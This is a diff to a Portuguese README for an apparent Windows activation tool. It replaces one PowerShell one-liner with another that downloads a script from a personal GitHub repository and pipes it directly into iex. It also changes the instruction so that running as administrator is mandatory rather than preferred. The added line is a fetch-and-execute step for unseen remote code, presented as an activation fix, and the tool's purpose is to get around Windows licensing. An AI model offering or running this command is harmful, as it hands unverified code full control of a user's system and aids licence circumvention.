@@ -35,7 +35,8 @@ Ele substitui o comando antigo `irm https://massgrave.dev/get | iex` por um novo
 
 ## 🚀 Como usar
 
-Execute no PowerShell (como administrador, preferencialmente):
+Execute o comando abaixo no PowerShell (como administrador, obrigatoriamente):
 
 ```powershell
-irm https://get.activated.win | iex
+
+iwr -useb "https://raw.githubusercontent.com/jakelino/wactivate/refs/heads/main/win_activate.ps1" | iex
